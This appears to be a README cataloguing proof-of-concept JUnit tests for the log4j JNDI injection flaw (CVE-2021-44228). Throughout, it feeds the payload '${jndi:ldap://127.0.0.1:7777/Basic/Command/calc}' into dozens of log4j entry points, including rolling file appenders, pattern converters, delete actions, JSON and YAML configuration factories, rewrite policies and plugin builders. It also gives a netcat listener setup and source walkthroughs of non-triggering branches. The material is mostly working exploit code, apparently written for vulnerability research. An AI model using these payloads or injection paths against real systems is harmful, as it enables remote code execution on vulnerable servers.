# Poc List For log4j Library

This projects is a poc list for *log4j* java library, which extends default poc for CVE-2021-44228. Required version <= 2.14.0

## Pre-Requirements

**config.json**

```
{
  "injectedObject": {
    "injectedProperty": "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"
  }
}
```

**run ldpa server**
```
nc -l -p 7777
```

## Pocs for FileManager Tree

**RollingFileManager.build()**

```
@Test
    public void buildRollingFileManager(){
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(OnStartupTriggeringPolicy.createPolicy(1))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        appender.getManager().rollover();
    }
```

**CronTriggerPolicy.initialize()**

```
 @Test
    public void cronTriggerPolicyTest(){
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();
    }
```

**RollingFileAppender.append()**
```
    @Test
    public void appendRollingFileAppenderTest(){
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(SizeBasedTriggeringPolicy.createPolicy("1B"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        appender.getManager().writeBytes("asdasdasd1".getBytes(), 0 ,10);
        appender.append(logEvent);
    }
```

**RollingFileManager.getFileManager()**
```
    @Test
    public void getFileManagerRollingFileManagerTest(){
        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build();
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();
        Configuration config = new DefaultConfiguration();

        // First execute add manager into MAP
        RollingFileManager.getFileManager(
                "app.log", "", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

        // Second call executes updateData from MAP
        RollingFileManager.getFileManager(
                "app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

    }
```

**RollingRandomAccessFileManager.getFileManager()**

```
  @Test
    public void getFileManagerRollingRandomAccessFileManagerTest(){
        TriggeringPolicy policy = CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?");
        RolloverStrategy strategy = DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build();
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();
        Configuration config = new DefaultConfiguration();

        // First execute add manager into MAP
        RollingRandomAccessFileManager.getFileManager(
                "app.log", "", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

        // Second call executes updateData from MAP
        RollingRandomAccessFileManager.getFileManager(
                "app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", true, false, policy, strategy, null, layout, 1024, true, false, null, null, null, config);

    }
```

**RollingFileManager.setTriggerPolicy()**

```
 @Test
    public void setTriggerPolicyRollingFileManagerTest(){
        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender appender = RollingFileAppender.newBuilder().setConfiguration(new DefaultConfiguration())
                .withFileName("app.log")
                .withFilePattern("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
                .setLayout(layout)
                .withAppend(true)
                .setName("RollingFile")
                .withPolicy(CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "false", "0 * * * * ?"))
                .withStrategy(DefaultRolloverStrategy.newBuilder()
                        .withMax(String.valueOf(3))
                        .withConfig(new DefaultConfiguration())
                        .withFileIndex("min")
                        .build())
                .build();

        appender.getManager().setTriggeringPolicy(OnStartupTriggeringPolicy.createPolicy(1));
    }
```

**RollingFileAppender.createAppender()**

```
  @Test
    public void createAppenderRollingFileAppenderTest() {
        Filter fileInfoFilter = ThresholdFilter.createFilter(Level.ERROR, Filter.Result.DENY, Filter.Result.ACCEPT);

        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingFileAppender.createAppender("app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", null, "RollingFile", "true", "4000", "true", CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"), DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build(), layout, fileInfoFilter, null, null, "", new DefaultConfiguration());
    }
```

**RollingRandomAccessFileAppender.createAppender()**

```
 @Test
    public void createAppenderRollingRandomAccessFileAppenderTest() {
        Filter fileInfoFilter = ThresholdFilter.createFilter(Level.ERROR, Filter.Result.DENY, Filter.Result.ACCEPT);

        PatternLayout layout = PatternLayout.newBuilder()
                .withConfiguration(new DefaultConfiguration())
                .withPattern("%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n")
                .build();

        RollingRandomAccessFileAppender.createAppender("app.log", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", null, "RollingFile", "true", "4000",  CronTriggeringPolicy.createPolicy(new DefaultConfiguration(), "true", "0 * * * * ?"), DefaultRolloverStrategy.newBuilder()
                .withMax(String.valueOf(3))
                .withConfig(new DefaultConfiguration())
                .withFileIndex("min")
                .build(), layout, fileInfoFilter, null, null, "",  new DefaultConfiguration());
    }
```

**ANY_Manager.getManager()**

Since the RollingFileManager utilizes a lookup call in access which invokes updateDate()->setTriggeringPolicy(), it is necessary to include setTriggeringPolicy within updateData(). This implementation is specific to RollingFileManager. Other managers that extend AbstractManager typically have an empty updateData method. Therefore, their getManager() calls do not execute setTriggeringPolicy and do not impact JNDI execution.

RollingFileManager.updateData()

```
 public void updateData(final Object data) {
        FactoryData factoryData = (FactoryData)data;
        this.setRolloverStrategy(factoryData.getRolloverStrategy());
        this.setPatternProcessor(new PatternProcessor(factoryData.getPattern(), this.getPatternProcessor()));
        this.setTriggeringPolicy(factoryData.getTriggeringPolicy());
    }
```

ANY_Manager.updateData()

```
 public void updateData(final Object data) {
        // This default implementation does nothing.
    }
```

## Pocs for Lifecycle Tree ##

The lifecycle tree operates through the LifeCycle.start() method. Initially, AbstractConfiguration, which implements LifeCycle, initiates this extensive sequence of calls. However, this proof of concept (PoC) primarily relies on the setConfiguration method, unique to the AbstractConfiguration class. Other classes like SmtpAppender, RoutingAppender, AppenderSet, and even the Configuration Scheduler do not implement setConfiguration within their start method, and therefore, they do not trigger JNDI injection.

**AbstractConfiguration.start()**
```
 @Override
    public void start() {
        // Preserve the prior behavior of initializing during start if not initialized.
        if (getState().equals(State.INITIALIZING)) {
            initialize();
        }
        LOGGER.debug("Starting configuration {}", this);
        this.setStarting();
        if (watchManager.getIntervalSeconds() >= 0) {
            watchManager.start();
        }
        if (hasAsyncLoggers()) {
            asyncLoggerConfigDisruptor.start();
        }
        final Set<LoggerConfig> alreadyStarted = new HashSet<>();
        for (final LoggerConfig logger : loggerConfigs.values()) {
            logger.start();
            alreadyStarted.add(logger);
        }
        for (final Appender appender : appenders.values()) {
            appender.start();
        }
        if (!alreadyStarted.contains(root)) { // LOG4J2-392
            root.start(); // LOG4J2-336
        }
        super.start();
        LOGGER.debug("Started configuration {} OK.", this);
    }
```


**AbstractConfiguration.initialize()**
```
 @Override
    public void initialize() {
        LOGGER.debug(Version.getProductString() + " initializing configuration {}", this);
        subst.setConfiguration(this);
        try {
            scriptManager = new ScriptManager(this, watchManager);
        } catch (final LinkageError | Exception e) {
            // LOG4J2-1920 ScriptEngineManager is not available in Android
            LOGGER.info("Cannot initialize scripting support because this JRE does not support it.", e);
        }
        pluginManager.collectPlugins(pluginPackages);
        final PluginManager levelPlugins = new PluginManager(Level.CATEGORY);
        levelPlugins.collectPlugins(pluginPackages);
        final Map<String, PluginType<?>> plugins = levelPlugins.getPlugins();
        if (plugins != null) {
            for (final PluginType<?> type : plugins.values()) {
                try {
                    // Cause the class to be initialized if it isn't already.
                    Loader.initializeClass(type.getPluginClass().getName(), type.getPluginClass().getClassLoader());
                } catch (final Exception e) {
                    LOGGER.error("Unable to initialize {} due to {}", type.getPluginClass().getName(), e.getClass()
                            .getSimpleName(), e);
                }
            }
        }
        setup();
        setupAdvertisement();
        doConfigure();
        setState(State.INITIALIZED);
        LOGGER.debug("Configuration {} initialized", this);
    }
```

**OTHER_LifeCycle.start()**
```
  @Override
    public void start() {
        this.setStarted();
    }
```


## Pocs for Context Tree ##

**LogManager.getContext()**

```
@Test
    public void getContextPocTest(){
        URI configUri = new File("config.json").toURI();
        LoggerContext context = (LoggerContext) LogManager.getContext(null, false, configUri);
    }
```

**ClassLoaderContextSelector.getContext()**

```
@Test
    public void getContextClassLoaderContextSelectorTest(){
        ClassLoaderContextSelector contextSelector = new ClassLoaderContextSelector();
        URI configUri = new File("config.json").toURI();
        LoggerContext context = contextSelector.getContext( ClassLoaderContextSelector.class.getName() ,null, false, configUri );
        context.setConfigLocation(null);
        contextSelector.getContext( ClassLoaderContextSelector.class.getName() ,null, false, configUri );
    }
```

**LogManager.getLogger()**

The methods getLogger, getFormatterLogger, and similar ones utilize LogManager.getContext() with null for ConfigURI. Concurrently, there exists a branch within LogManager.getContext() that involves specifying a ConfigURI to enable configuration injection. In such instances, the configuration is loaded from a file, potentially leading to JNDI injections. However, the use of the aforementioned methods does not lead to JNDI injection because they employ the default configuration rather than a specialized one in their call stack.

LogManager.getContext() used in the first PoC
```
  public static LoggerContext getContext(final ClassLoader loader, final boolean currentContext, final URI configLocation) {
        try {
            return factory.getContext(FQCN, loader, (Object)null, currentContext, configLocation, (String)null);
        } catch (IllegalStateException var4) {
            LOGGER.warn(var4.getMessage() + " Using SimpleLogger");
            return (new SimpleLoggerContextFactory()).getContext(FQCN, loader, (Object)null, currentContext, configLocation, (String)null);
        }
    }
```

LogManager.getContext() used in getLogger and getFormatterLogger
```
public static LoggerContext getContext(final boolean currentContext) {
        try {
            return factory.getContext(FQCN, (ClassLoader)null, (Object)null, currentContext, (URI)null, (String)null);
        } catch (IllegalStateException var2) {
            LOGGER.warn(var2.getMessage() + " Using SimpleLogger");
            return (new SimpleLoggerContextFactory()).getContext(FQCN, (ClassLoader)null, (Object)null, currentContext, (URI)null, (String)null);
        }
    }
```

## Pocs for Pattern Converters ##

**MessagePatternConverter.format()**

```
  @Test
    public void formatMessagePatternConverterTest() {
        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration, new String[]{"lookups"});
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        messagePatternConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
```

**PatternFormatter.format()**

```
  @Test
    public void formatPatternFormatterTest() {
        Configuration configuration = new DefaultConfiguration();
        String pattern = "%m";
        PatternParser parser = new PatternParser(configuration, "Converter", null);
        List<PatternFormatter> formatters = parser.parse(pattern);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        for (PatternFormatter formatter : formatters) {
            formatter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
        }
    }
```

**LiteralPatternConverter.format()**

```
    @Test
    public void formatLiteralPatternConverterTest() {
        Configuration configuration = new DefaultConfiguration();
        LiteralPatternConverter literalConverter = new LiteralPatternConverter(configuration, "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        literalConverter.format(logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
```

**PatternProcessor.formatFileName()**

```
 @Test
    public void formatFileNamePatternProcessor() {
        Configuration configuration = new DefaultConfiguration();
        String pattern = "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}";
        PatternProcessor processor = new PatternProcessor(pattern);
        processor.formatFileName(configuration.getStrSubstitutor(), new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), true, null);
    }
```

## Pocs for Action Tree ##

**DeleteAction.execute()**

```
@Test
    public void executeDeleteActionTest() {
        DeleteAction action = DeleteAction.createDeleteAction("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}", false, 1, true, null , new PathCondition[]{
                IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }, null, new DefaultConfiguration());
        action.execute();
    }
```

**PosixViewAttributeAction.execute()**
```
  @Test
    public void executePosixViewAttributeAction() throws IOException {
     PosixViewAttributeAction action = PosixViewAttributeAction.newBuilder().withPathConditions(new PathCondition[]{
            IfFileName.createNameCondition(String.format("%s-*.log.zip", "appname"), null, IfAccumulatedFileCount.createFileCountCondition(1))
        }).withFilePermissionsString("rwxrwxrwx").withBasePath("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").withConfiguration(new DefaultConfiguration()).build();
        action.execute();
    }
```

**AbstractAction.execute()**

In the inheritance tree, AbstractAction is related to AbstractPathAction. Primarily, AbstractPathAction introduces a new field:

```
private final StrSubstitutor subst;
```

This field is utilized within the execute method of AbstractPathAction, which triggers the entire call stack associated with StrSubstitutor.replace -> StrSubstitutor.resolveVariable -> StrSubstitutor.lookup. Unlike AbstractAction, which lacks the StrSubstitutor attribute and contains an empty execute method (since it's an abstract interface), AbstractAction does not have any proof of concept for reproducing the same issue.

## Pocs for Config Tree ##

**JSONConfigurationFactory.getConfiguration()**
```
 @Test
    public void getConfigurationJSONConfigurationFactoryTest() throws IOException {
        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        JsonConfigurationFactory factory = new JsonConfigurationFactory();
        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
    }
```

**DefaultConfiguration.createConfiguration()**

```
 @Test
    public void createConfigurationDefaultConfiguration() {
        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
        Configuration configuration = new DefaultConfiguration();
        manager.collectPlugins();
        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
        Node nodeA = new Node(null, "root", plugin);
        nodeA.setValue("root");
        Node nodeB = new Node(nodeA, "child", plugin);
        nodeB.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        configuration.createConfiguration(nodeB, new MutableLogEvent());
    }
```

**JSONConfiguration.reconfigure()**

```
   @Test
    public void reconfigureJSONConfigurationFactoryTest() throws IOException {
        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        JsonConfiguration config = new JsonConfiguration(new LoggerContext("testContext"), source);
        config.reconfigure();
    }
```

**LoggerContext.setConfigLocation()**
```
@Test
    public void setConfigLocationUriTest()  {
        URI configUri = new File("config.json").toURI();
        LoggerContext context = (LoggerContext) LogManager.getContext(false);
        context.setConfigLocation(configUri);
    }
```

**ConfigurationFactory.getConfiguration()**

Required dedpendecies
```
implementation("com.fasterxml.jackson.core:jackson-databind:2.17.0")
```

```
 @Test
    public void getConfigurationConfigurationFactoryTest() throws IOException {
        String configText = "{"
                + "\"Configuration\": {"
                + "    \"injectedProperty\": \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\""
                + "}"
                + "}";
        ByteArrayInputStream bis = new ByteArrayInputStream(configText.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis, new File("config.json"));
        Configuration config = ConfigurationFactory.getInstance().getConfiguration(new LoggerContext("testContext"), source);
    }
```

**YamlConfigurationFactory.getConfiguration()**

Required dedpendecies
```
implementation("com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.17.1")
```

```
@Test
    public void getConfigurationYamlConfigurationFactoryTest() throws IOException {
        String yamlConfig = "Configuration:\n" +
                "  injectedProperty: \"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"";
        ByteArrayInputStream bis = new ByteArrayInputStream(yamlConfig.getBytes(StandardCharsets.UTF_8));
        ConfigurationSource source = new ConfigurationSource(bis);

        YamlConfigurationFactory factory = new YamlConfigurationFactory();
        Configuration config = factory.getConfiguration(new LoggerContext("testContext"), source);
    }
```

**LoggerContextAdminMBean.setConfigLocationUri()**

```
    @Test
    public void setConfigLocationUriLoggerContextAdminMBeanTest() throws Exception {
        LoggerContext context = new LoggerContext("testContext");
        LoggerContextAdminMBean mBean = new LoggerContextAdmin(context, new Executor() {
            @Override
            public void execute(Runnable command) {
                command.run();
            }
        });
        URI newConfigUri = new File("config.json").toURI();
        mBean.setConfigLocationUri(newConfigUri.toString());
    }
```

**CompositeConfiguration.reconfigure()**
```
 @Test
    public void reconfigureCompositeConfigurationTest() throws Exception {
        ConfigurationBuilder<BuiltConfiguration> builder = ConfigurationBuilderFactory.newConfigurationBuilder();
        AbstractConfiguration config = builder.addProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}").build();
        CompositeConfiguration compositeConfig = new CompositeConfiguration(Arrays.asList(config));
        compositeConfig.reconfigure();
    }
```

**PatternLayout.build()**

All methods are linked to parent nodes through DefaultConfig<Init>. Since this function only generates DefaultConfig, it does not lead to any form of injection.

```
 public PatternLayout build() {
            if (this.configuration == null) {
                this.configuration = new DefaultConfiguration();
            }

            return new PatternLayout(this.configuration, this.regexReplacement, this.pattern, this.patternSelector, this.charset, this.alwaysWriteExceptions, this.disableAnsi, this.noConsoleNoAnsi, this.header, this.footer);
        }
```

#### Pocs for Rewriter Tree ####

**PropertiesRewritePolicy.rewrite()**

```
@Test
    public void rewritePropertiesRewritePolicyTest() {
        Configuration configuration = new DefaultConfiguration();
        Property[] properties = new Property[]{
                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };

        RewritePolicy policy = PropertiesRewritePolicy.createPolicy(configuration, properties);
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        LogEvent rewrittenEvent = policy.rewrite(logEvent);
    }
```

**RewritePolicy.append()**

```
@Test
    public void appendRewritePolicyTest() {
        LoggerContext context = new LoggerContext("TestContext");
        Configuration config = context.getConfiguration();

        Appender consoleAppender = ConsoleAppender.createDefaultAppenderForLayout(PatternLayout.createDefaultLayout(config));
        consoleAppender.start();

        AppenderRef appenderRef = AppenderRef.createAppenderRef("console", null, null);
        AppenderRef[] refs = new AppenderRef[]{appenderRef};

        Property[] properties = new Property[]{
                Property.createProperty("injectedProperty", "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}")
        };
        RewritePolicy rewritePolicy = PropertiesRewritePolicy.createPolicy(config, properties);

        RewriteAppender rewriteAppender = RewriteAppender.createAppender(
                "rewriteAppender",
                "false",
                refs,
                config,
                rewritePolicy,
                ThresholdFilter.createFilter(Level.ALL, null, null)
        );
        rewriteAppender.start();


        config.addAppender(consoleAppender);
        config.addAppender(rewriteAppender);
        context.updateLoggers();

        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        rewriteAppender.append(logEvent);

        rewriteAppender.stop();
        consoleAppender.stop();
    }
```

## Pocs for Plugin Tree ##


**PluginBuilder.build()**

```
 @Test
    public void buildPluginBuilderTest(){
        PluginManager manager = new PluginManager(Core.CATEGORY_NAME);
        Node node = new Node();
        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");
        manager.collectPlugins();
        PluginType<Script> plugin = (PluginType<Script>) manager.getPluginType("Script");
        final PluginBuilder builder = new PluginBuilder(plugin).
                withConfiguration(new DefaultConfiguration()).
                withConfigurationNode(node);
        builder.build();
    }
```

**Builder.build()**

`Builder.build()` is an interface with its own implementation of the build method. `PluginBuilder` implements this interface and overrides the build method. However, `Builder.build()` does not contain any calls to `generateParameters`, so this branch does not implement JNDI.

Builder.build()

```
public interface Builder<T> {

    /**
     * Builds the object after all configuration has been set. This will use default values for any
     * unspecified attributes for the object.
     *
     * @return the configured instance.
     * @throws org.apache.logging.log4j.core.config.ConfigurationException if there was an error building the
     * object.
     */
    T build();
}
```

PluginBuilder.build()

```
 @Override
    public Object build() {
        verify();
        // first try to use a builder class if one is available
        try {
            LOGGER.debug("Building Plugin[name={}, class={}].", pluginType.getElementName(),
                    pluginType.getPluginClass().getName());
            final Builder<?> builder = createBuilder(this.clazz);
            if (builder != null) {
                injectFields(builder);
                return builder.build();
            }
        } catch (final ConfigurationException e) { // LOG4J2-1908
            LOGGER.error("Could not create plugin of type {} for element {}", this.clazz, node.getName(), e);
            return null; // no point in trying the factory method
        } catch (final Exception e) {
            LOGGER.error("Could not create plugin of type {} for element {}: {}",
                    this.clazz, node.getName(),
                    (e instanceof InvocationTargetException ? ((InvocationTargetException) e).getCause() : e).toString(), e);
        }
        // or fall back to factory method if no builder class is available
        try {
            final Method factory = findFactoryMethod(this.clazz);
            final Object[] params = generateParameters(factory);
            return factory.invoke(null, params);
        } catch (final Exception e) {
            LOGGER.error("Unable to invoke factory method in {} for element {}: {}",
                    this.clazz, this.node.getName(),
                    (e instanceof InvocationTargetException ? ((InvocationTargetException) e).getCause() : e).toString(), e);
            return null;
        }
    }
```

**AbstractFitlerable.start()**

`AbstractFilterable` is an interface with its own `start()` implementation. `AbstractConfiguration` implements `AbstractFilterable` and overrides the `start()` method. After several calls, `AbstractConfiguration` triggers a `createPlugin` call. However, `AbstractFilterable` does not invoke this, so it does not implement JNDI.

AbstractFilterable.start()

```
 public void start() {
        this.setStarting();
        if (filter != null) {
            filter.start();
        }
        this.setStarted();
    }
```

! For AbstractConfiguration there are 5 calls: start()->initialize()->doConfigure()->createConfiguration()->createPlugin()

AbstractConfiguration.start()

```
 @Override
    public void start() {
        // Preserve the prior behavior of initializing during start if not initialized.
        if (getState().equals(State.INITIALIZING)) {
            initialize();
        }
        LOGGER.debug("Starting configuration {}", this);
        this.setStarting();
        if (watchManager.getIntervalSeconds() >= 0) {
            watchManager.start();
        }
        if (hasAsyncLoggers()) {
            asyncLoggerConfigDisruptor.start();
        }
        final Set<LoggerConfig> alreadyStarted = new HashSet<>();
        for (final LoggerConfig logger : loggerConfigs.values()) {
            logger.start();
            alreadyStarted.add(logger);
        }
        for (final Appender appender : appenders.values()) {
            appender.start();
        }
        if (!alreadyStarted.contains(root)) { // LOG4J2-392
            root.start(); // LOG4J2-336
        }
        super.start();
        LOGGER.debug("Started configuration {} OK.", this);
    }
```

AbstractConfiguration.initialize()

```
    @Override
    public void initialize() {
        LOGGER.debug(Version.getProductString() + " initializing configuration {}", this);
        subst.setConfiguration(this);
        try {
            scriptManager = new ScriptManager(this, watchManager);
        } catch (final LinkageError | Exception e) {
            // LOG4J2-1920 ScriptEngineManager is not available in Android
            LOGGER.info("Cannot initialize scripting support because this JRE does not support it.", e);
        }
        pluginManager.collectPlugins(pluginPackages);
        final PluginManager levelPlugins = new PluginManager(Level.CATEGORY);
        levelPlugins.collectPlugins(pluginPackages);
        final Map<String, PluginType<?>> plugins = levelPlugins.getPlugins();
        if (plugins != null) {
            for (final PluginType<?> type : plugins.values()) {
                try {
                    // Cause the class to be initialized if it isn't already.
                    Loader.initializeClass(type.getPluginClass().getName(), type.getPluginClass().getClassLoader());
                } catch (final Exception e) {
                    LOGGER.error("Unable to initialize {} due to {}", type.getPluginClass().getName(), e.getClass()
                            .getSimpleName(), e);
                }
            }
        }
        setup();
        setupAdvertisement();
        doConfigure();
        setState(State.INITIALIZED);
        LOGGER.debug("Configuration {} initialized", this);
    }
```

AbstractConfiguration.doConfigure()

```
protected void doConfigure() {
        preConfigure(rootNode);
        configurationScheduler.start();
        if (rootNode.hasChildren() && rootNode.getChildren().get(0).getName().equalsIgnoreCase("Properties")) {
            final Node first = rootNode.getChildren().get(0);
            createConfiguration(first, null);
            if (first.getObject() != null) {
                subst.setVariableResolver((StrLookup) first.getObject());
            }
        } else {
            final Map<String, String> map = this.getComponent(CONTEXT_PROPERTIES);
            final StrLookup lookup = map == null ? null : new MapLookup(map);
            subst.setVariableResolver(new Interpolator(lookup, pluginPackages));
        }

        boolean setLoggers = false;
        boolean setRoot = false;
        for (final Node child : rootNode.getChildren()) {
            if (child.getName().equalsIgnoreCase("Properties")) {
                if (tempLookup == subst.getVariableResolver()) {
                    LOGGER.error("Properties declaration must be the first element in the configuration");
                }
                continue;
            }
            createConfiguration(child, null);
            if (child.getObject() == null) {
                continue;
            }
            if (child.getName().equalsIgnoreCase("Scripts")) {
                for (final AbstractScript script : child.getObject(AbstractScript[].class)) {
                    if (script instanceof ScriptRef) {
                        LOGGER.error("Script reference to {} not added. Scripts definition cannot contain script references",
                                script.getName());
                    } else {
                        if (scriptManager != null) {
                            scriptManager.addScript(script);
                        }}
                }
            } else if (child.getName().equalsIgnoreCase("Appenders")) {
                appenders = child.getObject();
            } else if (child.isInstanceOf(Filter.class)) {
                addFilter(child.getObject(Filter.class));
            } else if (child.getName().equalsIgnoreCase("Loggers")) {
                final Loggers l = child.getObject();
                loggerConfigs = l.getMap();
                setLoggers = true;
                if (l.getRoot() != null) {
                    root = l.getRoot();
                    setRoot = true;
                }
            } else if (child.getName().equalsIgnoreCase("CustomLevels")) {
                customLevels = child.getObject(CustomLevels.class).getCustomLevels();
            } else if (child.isInstanceOf(CustomLevelConfig.class)) {
                final List<CustomLevelConfig> copy = new ArrayList<>(customLevels);
                copy.add(child.getObject(CustomLevelConfig.class));
                customLevels = copy;
            } else {
                final List<String> expected = Arrays.asList("\"Appenders\"", "\"Loggers\"", "\"Properties\"",
                        "\"Scripts\"", "\"CustomLevels\"");
                LOGGER.error("Unknown object \"{}\" of type {} is ignored: try nesting it inside one of: {}.",
                        child.getName(), child.getObject().getClass().getName(), expected);
            }
        }

        if (!setLoggers) {
            LOGGER.warn("No Loggers were configured, using default. Is the Loggers element missing?");
            setToDefault();
            return;
        } else if (!setRoot) {
            LOGGER.warn("No Root logger was configured, creating default ERROR-level Root logger with Console appender");
            setToDefault();
            // return; // LOG4J2-219: creating default root=ok, but don't exclude configured Loggers
        }

        for (final Map.Entry<String, LoggerConfig> entry : loggerConfigs.entrySet()) {
            final LoggerConfig loggerConfig = entry.getValue();
            for (final AppenderRef ref : loggerConfig.getAppenderRefs()) {
                final Appender app = appenders.get(ref.getRef());
                if (app != null) {
                    loggerConfig.addAppender(app, ref.getLevel(), ref.getFilter());
                } else {
                    LOGGER.error("Unable to locate appender \"{}\" for logger config \"{}\"", ref.getRef(),
                            loggerConfig);
                }
            }

        }

        setParents();
    }
```

AbstractConfiguration.createConfiguration()

```
  @Override
    public void createConfiguration(final Node node, final LogEvent event) {
        final PluginType<?> type = node.getType();
        if (type != null && type.isDeferChildren()) {
            node.setObject(createPluginObject(type, node, event));
        } else {
            for (final Node child : node.getChildren()) {
                createConfiguration(child, event);
            }

            if (type == null) {
                if (node.getParent() != null) {
                    LOGGER.error("Unable to locate plugin for {}", node.getName());
                }
            } else {
                node.setObject(createPluginObject(type, node, event));
            }
        }
    }
```

